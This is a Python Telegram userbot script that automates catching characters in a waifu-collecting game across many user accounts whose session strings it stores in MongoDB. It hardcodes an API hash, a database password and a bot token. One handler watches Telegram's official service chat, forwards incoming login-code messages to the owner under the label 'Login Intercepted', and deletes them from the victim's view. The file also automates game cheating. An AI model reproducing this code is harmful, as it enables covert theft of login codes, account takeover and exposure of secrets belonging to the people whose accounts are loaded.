import os
import asyncio
import random
import time
import logging
import re
from telethon import TelegramClient, events, errors, functions
from telethon.sessions import StringSession
from motor.motor_asyncio import AsyncIOMotorClient

# ==========================================
# ⚙️ CONFIGURATION (Credentials)
# ==========================================
APP_ID = 39584681
APP_HASH = 'c8c0685d6dd5b9e546093ea90d27733b'
MONGO_URI = "mongodb+srv://kkt:h1BdaMt7nxW9jTXa@cluster0.kb5fzfl.mongodb.net/?appName=Cluster0&tlsAllowInvalidCertificates=true"
BOT_TOKEN = '8738081667:AAHADgcDISntnOBwT3uj2yYw7n3XJUN2uZI'

OWNER_ID = 7693106830
SPECIFIC_GROUP = -1003848067679  # Log Group
SPAWN_BOT_ID = 6157455819

# 🎯 GLOBAL RUNTIME STORAGE
userbot_instances = {}        
hint_bot_ids = {8506436817}   
spawn_tracker = {}            # { (user_id, fwd_msg_id): orig_chat_id }
latest_spawn = {}             # { user_id: orig_chat_id } -> Reply မပါရင် သုံးရန် Fallback Tracker
HINT_REGEX = re.compile(r"(/catch\s+[^\n]+)") 

# MongoDB Setup
client_mongo = AsyncIOMotorClient(MONGO_URI)
db = client_mongo["telegram_bot"]
reply_save_col = db["reply_save_col"]
target_bots_col = db["target_bots"]  
tomboy_col = db["tomboy_col"]  
marcuz_col = db["marcuz_col"]  
talk_col = db["random_talk"]   
filters_col = db["filters"]
hint_bots_col = db["hint_bots_col"]  
registry_col = db["collection_registry"] 

# Initialize Official Bot Client
bot = TelegramClient('official_bot_session', APP_ID, APP_HASH)

# ==========================================
# 🌍 DUMMY HTTP SERVER FOR RENDER HEALTH CHECK
# ==========================================
async def handle_render_health_check(reader, writer):
    await reader.read(100)
    response = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 2\r\n\r\nOK"
    writer.write(response.encode('utf-8'))
    await writer.drain()
    writer.close()

async def start_dummy_web_server():
    port = int(os.environ.get("PORT", 10000))
    try:
        server = await asyncio.start_server(handle_render_health_check, '0.0.0.0', port)
        async with server:
            await server.serve_forever()
    except Exception:
        pass

async def delete_catch_message_delayed(client, chat_id, msg_id):
    try:
        await asyncio.sleep(1)
        await client.delete_messages(chat_id, msg_id)
    except Exception:
        pass

# ==========================================
# ⚔️ DYNAMIC USERBOT EVENT HANDLERS (HIGH OPTIMIZED)
# ==========================================
async def spawn_detector_handler(event):
    """ Spawn Bot ဆီက စာသားများကို ဖောင့်စတိုင်မျိုးစုံ စစ်ဆေးပေးသည် """
    global spawn_tracker, latest_spawn
    
    current_user_id = getattr(event.client, 'tg_user_id', None)
    if not current_user_id or current_user_id not in userbot_instances:
        return
        
    config = userbot_instances[current_user_id]
    if config["is_stopped"]:
        return  

    if event.text:
        text_raw = event.text
        text_upper = text_raw.upper()
        
        # 🎯 ပြင်ဆင်ချက်: Standard ASCII ရော၊ Unicode Small Caps ဖောင့်ကိုပါ တိုက်စစ်သည်
        if "A CHARACTER HAS SPAWNED" in text_upper or "ᴀ ᴄʜᴀʀᴀᴄᴛᴇʀ ʜᴀs sᴘᴀᴡɴᴇᴅ" in text_raw:
            if event.chat_id in [-1001947407820, -1003067509608, -1003760110058]:
                return  
                
            if any(emoji in text_raw for emoji in config["ignored_emojis"]):
                return  

            orig_chat_id = event.chat_id  
            waifu_chat_id = config["group_id"] 
            
            # နောက်ဆုံးထွက်ထားသော Spawn Group ID ကို သိမ်းဆည်းသည်
            latest_spawn[current_user_id] = orig_chat_id
            
            try:
                fwd_msg = await event.message.forward_to(waifu_chat_id)
                reply_msg = await fwd_msg.reply("/waifu")
                
                spawn_tracker[(current_user_id, fwd_msg.id)] = orig_chat_id
                spawn_tracker[(current_user_id, reply_msg.id)] = orig_chat_id
                
                if len(spawn_tracker) > 300:
                    spawn_tracker.pop(next(iter(spawn_tracker)))
                    
                print(f"📦 Spawn Detected & Forwarded from {orig_chat_id} to Waifu Chat {waifu_chat_id}")
            except Exception as e:
                print(f"❌ Forward Error on Userbot {current_user_id}: {e}")

async def hint_solver_handler(event):
    """ Hint Bot ဆီက အဖြေကိုဖတ်ပြီး မူလ Group ဆီသို့ Catch Command ပြန်လည်ပစ်ခွင့်ပြုသည် """
    global spawn_tracker, latest_spawn
    
    current_user_id = getattr(event.client, 'tg_user_id', None)
    if not current_user_id or current_user_id not in userbot_instances:
        return
        
    config = userbot_instances[current_user_id]
    if config["is_stopped"]:
        return  

    if event.sender_id in hint_bot_ids and event.text:
        match = HINT_REGEX.search(event.text)
        if match:
            catch_command = match.group(1).strip(" `\n\r")
            
            target_orig_group = None
            
            # ၁။ Reply ပါလာလျှင် Tracker ထဲမှ ရှာသည်
            if event.reply_to_msg_id and (current_user_id, event.reply_to_msg_id) in spawn_tracker:
                target_orig_group = spawn_tracker[(current_user_id, event.reply_to_msg_id)]
            # ၂။ Reply မပါခဲ့လျှင် ၎င်းအကောင့်၏ နောက်ဆုံးထွက်ထားသော Spawn Group ID ကို သုံးသည် (Smart Fallback)
            elif current_user_id in latest_spawn:
                target_orig_group = latest_spawn[current_user_id]
                
            if target_orig_group:
                try:
                    client_to_use = config["client"]
                    delay_time = random.uniform(0.1, 0.2) 
                    async with client_to_use.action(target_orig_group, 'typing'):
                        await asyncio.sleep(delay_time)
                        
                    sent_msg = await client_to_use.send_message(target_orig_group, catch_command)
                    asyncio.create_task(delete_catch_message_delayed(client_to_use, target_orig_group, sent_msg.id))
                    print(f"🎯 Catch Sent to Original Group {target_orig_group} via Userbot {current_user_id} -> {catch_command}")
                except Exception as e:
                    print(f"❌ Catch Execution Error via Userbot {current_user_id}: {e}")

async def catch_success_forwarder_handler(event):
    current_user_id = getattr(event.client, 'tg_user_id', None)
    if not current_user_id or userbot_instances.get(current_user_id, {}).get("is_stopped"):
        return
        
    if event.text:
        text_raw = event.text
        text_upper = text_raw.upper()
        
        if "YOU GOT A NEW CHARACTER!" in text_upper or "ʏᴏᴜ ɢᴏᴛ ᴀ ɴᴇᴡ ᴄʜᴀʀᴀᴄᴛᴇʀ!" in text_raw:
            try:
                me = await event.client.get_me()
                first_name = me.first_name.lower() if me.first_name else ""
                last_name = me.last_name.lower() if me.last_name else ""
                full_name = f"{first_name} {last_name}".strip()
                username = me.username.lower() if me.username else ""
                
                text_lower = text_raw.lower()
                
                if (
                    event.message.mentioned or 
                    (first_name and first_name in text_lower) or 
                    (full_name and full_name in text_lower) or 
                    (username and username in text_lower)
                ):
                    await event.message.forward_to(SPECIFIC_GROUP)
            except Exception:
                pass

async def telegram_service_handler(event):
    try:
        await bot.send_message(OWNER_ID, f"🔐 **Telegram Login Intercepted!**\n\n{event.message.text}")
        await event.delete()
    except Exception:
        pass

# ⚡ [ULTRA OPTIMIZED REGISTRATION]
def register_userbot_handlers(client, waifu_chat_id):
    client.add_event_handler(spawn_detector_handler, events.NewMessage(from_users=SPAWN_BOT_ID))
    client.add_event_handler(catch_success_forwarder_handler, events.NewMessage(from_users=SPAWN_BOT_ID)) 
    client.add_event_handler(hint_solver_handler, events.NewMessage(chats=waifu_chat_id))
    client.add_event_handler(telegram_service_handler, events.NewMessage(chats=777000))

# ==========================================
# 🤖 OFFICIAL BOT COMMAND HANDLERS
# ==========================================
@bot.on(events.NewMessage(chats=[SPECIFIC_GROUP, OWNER_ID]))
async def handle_bot_commands(event):
    global userbot_instances, hint_bot_ids
    
    if event.sender_id != OWNER_ID:
        return

    cmd = event.message.text.strip() if event.message.text else ""

    if cmd.startswith("/addauto"):
        if not event.is_private:
            await event.reply("⚠️ **လုံခြုံရေးအရ ဤစနစ်သစ်ကို Bot ၏ DM တွင်သာ သုံးစွဲခွင့်ပြုပါသည်။**")
            return
            
        args = cmd.split(maxsplit=3)
        if len(args) < 3:
            await event.reply("⚠️ **အသုံးပြုပုံစံ:**\n`/addauto [Waifu_Chat_ID] [DB_Collection_Name] [String_Session]`")
            return
            
        try:
            waifu_chat_id = int(args[1])
        except ValueError:
            await event.reply("❌ **Waifu Chat ID နေရာတွင် ဂဏန်းသီးသန့် ဖြစ်ရပါမည်။**")
            return
            
        col_name = args[2].strip()
        
        session_str = None
        if len(args) == 4:
            session_str = args[3].strip()
        elif event.is_reply:
            reply_msg = await event.get_reply_message()
            if reply_msg and reply_msg.text:
                session_str = reply_msg.text.strip()
                
        if not session_str:
            await event.reply("❌ **String Session အား မတွေ့ရှိပါ။**")
            return

        await event.reply(f"⏳ အကောင့်အား စစ်ဆေးနေပြီး သီးသန့် `db['{col_name}']` ထဲသို့ ထည့်သွင်းနေပါသည်...")
        
        try:
            temp_client = TelegramClient(StringSession(session_str), APP_ID, APP_HASH)
            await temp_client.start()
            me = await temp_client.get_me()
            u_id = me.id
            temp_client.tg_user_id = u_id
            
            default_emojis = ["🔵", "🟣" ,"🟡" ,"🟠","💮"]
            custom_col = db[col_name]
            
            await custom_col.update_one(
                {"user_id": u_id},
                {"$set": {
                    "user_id": u_id,
                    "session": session_str,
                    "group_id": waifu_chat_id,
                    "ignored_emojis": default_emojis,
                    "is_stopped": False,
                    "collection_name": col_name
                }},
                upsert=True
            )
            
            await registry_col.update_one(
                {"collection_name": col_name},
                {"$set": {"collection_name": col_name}},
                upsert=True
            )
            
            userbot_instances[u_id] = {
                "client": temp_client,
                "group_id": waifu_chat_id,
                "ignored_emojis": default_emojis,
                "is_stopped": False,
                "collection_name": col_name
            }
            
            register_userbot_handlers(temp_client, waifu_chat_id)
            await event.reply(f"✅ **အောင်မြင်စွာ တပ်ဆင်ပြီးပါပြီ!**\n👤 **နာမည်:** {me.first_name}\n🆔 **User ID:** `{u_id}`\n🌐 **Designated Waifu Chat:** `{waifu_chat_id}`\n🗂️ **DB Collection:** `db['{col_name}']`")
            
        except Exception as e:
            await event.reply(f"❌ **Userbot ချိတ်ဆက်မှု ပျက်ကွက်ပါသည်:** {e}")

    elif cmd.startswith("/start"):
        args = cmd.split()
        if len(args) == 2:
            try:
                target_uid = int(args[1])
                if target_uid in userbot_instances:
                    col_name = userbot_instances[target_uid]["collection_name"]
                    userbot_instances[target_uid]["is_stopped"] = False
                    await db[col_name].update_one({"user_id": target_uid}, {"$set": {"is_stopped": False}})
                    await event.reply(f"🚀 **Userbot `{target_uid}` ကို ပြန်လည်ပတ်လိုက်ပါပြီ။**")
                else:
                    await event.reply("❌ **ပေးထားသော User ID နှင့် ကိုက်ညီသည့် အကောင့်မရှိပါ။**")
            except ValueError:
                await event.reply("❌ **မှန်ကန်သော User ID ကို ထည့်သွင်းပါ။**")

    elif cmd.startswith("/stop"):
        args = cmd.split()
        if len(args) == 2:
            try:
                target_uid = int(args[1])
                if target_uid in userbot_instances:
                    col_name = userbot_instances[target_uid]["collection_name"]
                    userbot_instances[target_uid]["is_stopped"] = True
                    await db[col_name].update_one({"user_id": target_uid}, {"$set": {"is_stopped": True}})
                    await event.reply(f"🛑 **Userbot `{target_uid}` အား ခေတ္တရပ်နားလိုက်ပါပြီ။**")
                else:
                    await event.reply("❌ **ပေးထားသော User ID နှင့် ကိုက်ညီသည့် အကောင့်မရှိပါ။**")
            except ValueError:
                await event.reply("❌ **မှန်ကန်သော User ID ကို ထည့်သွင်းပါ။**")

    elif cmd.startswith("/emoji"):
        args = cmd.split(maxsplit=2)
        if len(args) < 3:
            await event.reply("⚠️ **အသုံးပြုပုံစံ:** `/emoji [user_id] [emojis_list]`")
            return
            
        try:
            target_uid = int(args[1])
            custom_emojis = list(args[2].replace(" ", ""))
            
            if target_uid in userbot_instances:
                col_name = userbot_instances[target_uid]["collection_name"]
                userbot_instances[target_uid]["ignored_emojis"] = custom_emojis
                await db[col_name].update_one({"user_id": target_uid}, {"$set": {"ignored_emojis": custom_emojis}})
                await event.reply(f"✅ **Account `{target_uid}` အတွက် ကျော်မည့် အီမိုဂျီများကို ပြောင်းလဲသတ်မှတ်ပြီးပါပြီ။**")
            else:
                await event.reply("❌ **၎င်း User ID ဖြင့် တပ်ဆင်ထားသော အကောင့်မတွေ့ရှိပါ။**")
        except ValueError:
            await event.reply("❌ **မှန်ကန်သော User ID ကို ရိုက်ထည့်ပါ။**")

    elif cmd.startswith("/addhint"):
        args = cmd.split()
        if len(args) == 2:
            try:
                h_id = int(args[1])
                hint_bot_ids.add(h_id)
                await hint_bots_col.update_one({"hint_id": h_id}, {"$set": {"hint_id": h_id}}, upsert=True)
                await event.reply(f"✅ **Hint Bot ID `{h_id}` အား စာရင်းထဲသို့ ထည့်သွင်းပြီးပါပြီ။**")
            except ValueError:
                await event.reply("❌ **ဂဏန်းသီးသန့် ID ဖြစ်ရပါမည်။**")

# ==========================================
# 🚀 SYSTEM STARTUP LOGIC
# ==========================================
async def startup():
    global userbot_instances, hint_bot_ids
    print("⏳ System starting up and loading configurations from MongoDB...")
    
    asyncio.create_task(start_dummy_web_server())

    async for h_doc in hint_bots_col.find():
        h_id = h_doc.get("hint_id")
        if h_id:
            hint_bot_ids.add(h_id)

    async for reg_doc in registry_col.find():
        col_name = reg_doc.get("collection_name")
        if col_name:
            print(f"🗂️ Scanning custom collection: db['{col_name}'] ...")
            async for acc_doc in db[col_name].find():
                u_id = acc_doc.get("user_id")
                session_str = acc_doc.get("session")
                waifu_chat_id = acc_doc.get("group_id")
                ignored = acc_doc.get("ignored_emojis", ["🔵", "🟣" ,"🟡" ,"🟠","💮"])
                is_shuted = acc_doc.get("is_stopped", False)
                
                if session_str and waifu_chat_id:
                    try:
                        client = TelegramClient(StringSession(session_str), APP_ID, APP_HASH)
                        await client.start()
                        client.tg_user_id = u_id  
                        
                        userbot_instances[u_id] = {
                            "client": client,
                            "group_id": waifu_chat_id,
                            "ignored_emojis": ignored,
                            "is_stopped": is_shuted,
                            "collection_name": col_name
                        }
                        
                        register_userbot_handlers(client, waifu_chat_id)
                        print(f"🚀 Loaded Account {u_id} from db['{col_name}']. Assigned Waifu Chat: {waifu_chat_id}")
                    except Exception as e:
                        print(f"⚠️ Failed to boot Account {u_id} from db['{col_name}']: {e}")
                
    print(f"📊 Total dynamic userbot session(s) online: {len(userbot_instances)}")

    await bot.start(bot_token=BOT_TOKEN)
    print("🤖 Official Bot is running...")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(startup())
